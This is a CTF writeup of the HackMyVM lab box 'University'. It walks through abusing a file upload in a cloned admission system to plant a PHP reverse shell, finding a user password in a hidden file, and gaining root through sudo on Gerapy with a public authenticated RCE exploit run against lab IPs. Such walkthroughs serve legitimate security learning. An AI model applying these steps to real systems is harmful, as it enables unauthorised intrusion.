---
layout: single
title:  "University - HackMyVM Writeup"
excerpt: "Linux - Easy --> Online-Admission System File Upload - Gerapy RCE"
---

# Index
---

- [Enumeration](#enumeration)
- [Vulnerability Analysis](#vulnerability-analysis)
- [Exploitation](#exploitation)
- [Gaining User Access](#gaining-user-access)
- [Privilege Escalation](#privilege-escalation)

# Enumeration
---

![Image]({{ site.baseurl }}/images/HackMyVM/University/1.png)

# Vulnerability Analysis
---

https://github.com/rskoolrash/Online-Admission-System

Analyzing the results of the directory enumeration and comparing it with the repository, I see that it is a cloning of the repository.

![Image]({{ site.baseurl }}/images/HackMyVM/University/2.png)

![Image]({{ site.baseurl }}/images/HackMyVM/University/3.png)

![Image]({{ site.baseurl }}/images/HackMyVM/University/4.png)

In documents.php apparently we can upload files. I will see if I can upload a PHP Revshell PentestMonkey.

# Exploitation
---

![Image]({{ site.baseurl }}/images/HackMyVM/University/5.png)

When I try to upload only 1 file I get an error. Analyzing the content of "fileupload.php" in the repository, I see that apparently it requires all the files to be uploaded at the same time.

When uploading all the files, I no longer get any errors, but I don't see any output on the web. Reading the code I see that one of the directories to which these files are uploaded is "/studentpic/", so here inside should be the "shell.php" that I uploaded.

![Image]({{ site.baseurl }}/images/HackMyVM/University/6.png)

![Image]({{ site.baseurl }}/images/HackMyVM/University/7.png)

I see that the file exists, and when I access it I receive the revshell.

![Image]({{ site.baseurl }}/images/HackMyVM/University/8.png)

# Gaining User Access
---

![Image]({{ site.baseurl }}/images/HackMyVM/University/9.png)

![Image]({{ site.baseurl }}/images/HackMyVM/University/10.png)

I found a file called .sandra_secret which contains what could be a password.

![Image]({{ site.baseurl }}/images/HackMyVM/University/11.png)

![Image]({{ site.baseurl }}/images/HackMyVM/University/12.png)

# Privilege Escalation
---

Checking for sudo permissions on the user, I found that we can run the program "/usr/local/bin/gerapy" as root.

![Image]({{ site.baseurl }}/images/HackMyVM/University/13.png)

On the error log the version Gerapy 0.9.6 was detected. Running the program with sudo we can confirm that version.

![Image]({{ site.baseurl }}/images/HackMyVM/University/14.png)

https://github.com/Gerapy/Gerapy

On the repository we can find the way to run this program.

``` yaml
sudo gerapy init
cd gerapy
sudo gerapy migrate
sudo gerapy createsuperuser

Credentials --> kuro:administrator123

# Command to run the server in public mode
sudo gerapy runserver 0.0.0.0:8000

```

Using SearchSploit, I found an Authenticated RCE exploit for this version.

![Image]({{ site.baseurl }}/images/HackMyVM/University/20.png)

To install the exploit I used the following lines:

``` yaml
searchsploit -m 50640.py

python3 -m venv venv
source venv/bin/activate

pip install pyfiglet
pip install requests

```

Now I modified the exploit to use the credentials I put in when I set up the server. After modifying the credentials, I tried to run the exploit, but it raises an error because it needs a project created on the Gerapy server, so I manually created it on the GUI.

![Image]({{ site.baseurl }}/images/HackMyVM/University/23.png)

![Image]({{ site.baseurl }}/images/HackMyVM/University/24.png)

With the project created, now we can run the exploit.

``` yaml
python3 50640.py -t 192.168.1.85 -p 8000 -L 192.168.1.84 -P 4444
```

![Image]({{ site.baseurl }}/images/HackMyVM/University/25.png)


